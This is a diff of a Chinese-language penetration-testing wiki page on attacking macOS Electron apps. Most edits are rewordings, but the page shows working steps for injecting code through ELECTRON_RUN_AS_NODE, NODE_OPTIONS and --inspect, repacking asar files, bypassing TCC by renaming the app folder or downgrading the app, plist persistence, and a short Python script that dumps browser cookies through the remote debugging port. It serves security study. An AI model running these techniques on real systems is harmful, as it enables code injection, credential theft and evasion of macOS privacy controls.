@@ -56,7 +56,7 @@ LoadBrowserProcessSpecificV8Snapshot is Disabled
 grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" Slack.app/
 Binary file Slack.app//Contents/Frameworks/Electron Framework.framework/Versions/A/Electron Framework matches
 ```
-你可以在[https://hexed.it/](https://hexed.it/)中加载此文件并搜索先前的字符串。在此字符串之后，您可以在ASCII中看到一个数字“0”或“1”，表示每个保险丝是否被禁用或启用。只需修改十六进制代码（`0x30`表示`0`，`0x31`表示`1`）来**修改保险丝的值**。
+您可以在[https://hexed.it/](https://hexed.it/)中加载此文件并搜索先前的字符串。在此字符串之后，您可以在ASCII中看到一个数字“0”或“1”，表示每个保险丝是否被禁用或启用。只需修改十六进制代码（`0x30`表示`0`，`0x31`表示`1`）以**修改保险丝的值**。
 
 <figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
@@ -72,14 +72,22 @@ Electron应用程序可能使用**外部JS/HTML文件**，因此攻击者可以�
 * 需要**`kTCCServiceSystemPolicyAppBundles`**权限来修改应用程序，因此默认情况下不再可能。
 * 编译的**`asap`**文件通常启用了**`embeddedAsarIntegrityValidation`**和**`onlyLoadAppFromAsar`**的保险丝
 
-这使得攻击路径更加复杂（或不可能）。
+这使得攻击路径变得更加复杂（或不可能）。
 {% endhint %}
 
-请注意，可以通过将应用程序复制到另一个目录（如**`/tmp`**），将文件夹**`app.app/Contents`**重命名为**`app.app/NotCon`**，使用您的**恶意**代码修改**asar**文件，将其重新命名为**`app.app/Contents`**并执行它来绕过**`kTCCServiceSystemPolicyAppBundles`**的要求。
+请注意，可以通过将应用程序复制到另一个目录（如**`/tmp`**），将文件夹**`app.app/Contents`**重命名为**`app.app/NotCon`**，使用您的**恶意**代码修改**asar**文件，然后将其重新命名为**`app.app/Contents`**并执行来绕过**`kTCCServiceSystemPolicyAppBundles`**的要求。
 
-## 使用`ELECTRON_RUN_AS_NODE`进行RCE <a href="#electron_run_as_node" id="electron_run_as_node"></a>
+您可以使用以下命令从asar文件中解压缩代码：
+```bash
+npx asar extract app.asar app-decomp
+```
+并在修改后重新打包：
+```bash
+npx asar pack app-decomp app-new.asar
+```
+## 使用 `ELECTRON_RUN_AS_NODE` 进行远程代码执行（RCE）<a href="#electron_run_as_node" id="electron_run_as_node"></a>
 
-根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)，如果设置了此环境变量，它将以普通的Node.js进程启动该进程。
+根据[**文档**](https://www.electronjs.org/docs/latest/api/environment-variables#electron\_run\_as\_node)的说明，如果设置了这个环境变量，它将以普通的 Node.js 进程启动。
 
 {% code overflow="wrap" %}
 ```bash
@@ -127,7 +135,7 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% code overflow="wrap" %}
 ```bash
 # Content of /tmp/payload.js
-require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Ca$
+require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator');
 
 # Execute
 NODE_OPTIONS="--require /tmp/payload.js" ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord
@@ -169,14 +177,14 @@ require('child_process').execSync('/System/Applications/Calculator.app/Contents/
 {% endcode %}
 
 {% hint style="danger" %}
-如果禁用了fuse**`EnableNodeCliInspectArguments`**，应用程序在启动时将**忽略节点参数**（如`--inspect`），除非设置了环境变量**`ELECTRON_RUN_AS_NODE`**，但如果禁用了fuse**`RunAsNode`**，该环境变量也将被**忽略**。
+如果禁用了fuse**`EnableNodeCliInspectArguments`**，应用程序在启动时将**忽略节点参数**（如`--inspect`），除非设置了环境变量**`ELECTRON_RUN_AS_NODE`**，但如果禁用了fuse**`RunAsNode`**，它也将被**忽略**。
 
 但是，您仍然可以使用**electron参数`--remote-debugging-port=9229`**，但之前的有效载荷将无法执行其他进程。
 {% endhint %}
 
-使用参数**`--remote-debugging-port=9222`**，可以从Electron应用程序中窃取一些信息，例如浏览器的**历史记录**（使用GET命令）或**cookies**（因为它们在浏览器内部被**解密**，并且有一个**json端点**可以提供它们）。
+使用参数**`--remote-debugging-port=9222`**可以从Electron应用程序中窃取一些信息，例如**历史记录**（使用GET命令）或浏览器的**cookie**（因为它们在浏览器内部被**解密**，并且有一个**json端点**可以提供它们）。
 
-您可以在[**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)和[**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)了解如何做到这一点，并使用自动工具[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)或类似的简单脚本：
+您可以在[**这里**](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)和[**这里**](https://slyd0g.medium.com/debugging-cookie-dumping-failures-with-chromiums-remote-debugger-8a4c4d19429f)了解如何做到这一点，并使用自动工具[WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)或一个简单的脚本，如：
 ```python
 import websocket
 ws = websocket.WebSocket()
@@ -184,9 +192,9 @@ ws.connect("ws://localhost:9222/devtools/page/85976D59050BFEFDBA48204E3D865D00",
 ws.send('{\"id\": 1, \"method\": \"Network.getAllCookies\"}')
 print(ws.recv()
 ```
-### 从App Plist中进行注入
+### 从App Plist进行注入
 
-您可以滥用plist中的这个环境变量来保持持久性，添加以下键：
+您可以滥用plist中的此环境变量以保持持久性，添加以下键：
 ```xml
 <dict>
 <key>ProgramArguments</key>
@@ -203,12 +211,12 @@ print(ws.recv()
 ## TCC绕过滥用旧版本
 
 {% hint style="success" %}
-macOS的TCC守护程序不会检查应用程序的执行版本。因此，如果您无法使用先前的任何技术在Electron应用程序中注入代码，您可以下载先前的应用程序版本并在其中注入代码，因为它仍然会获得TCC权限。
+macOS的TCC守护程序不会检查应用程序的执行版本。因此，如果您无法使用先前的任何技术在Electron应用程序中注入代码，您可以下载先前的应用程序版本并在其中注入代码，因为它仍将获得TCC权限（除非Trust Cache阻止）。
 {% endhint %}
 
 ## 自动注入
 
-工具[**electroniz3r**](https://github.com/r3ggi/electroniz3r)可以轻松地用于查找已安装的易受攻击的Electron应用程序并在其中注入代码。该工具将尝试使用**`--inspect`**技术：
+工具[**electroniz3r**](https://github.com/r3ggi/electroniz3r)可以轻松用于查找已安装的易受攻击的Electron应用程序并在其中注入代码。该工具将尝试使用**`--inspect`**技术：
 
 您需要自己编译它，并可以像这样使用它：
 ```bash
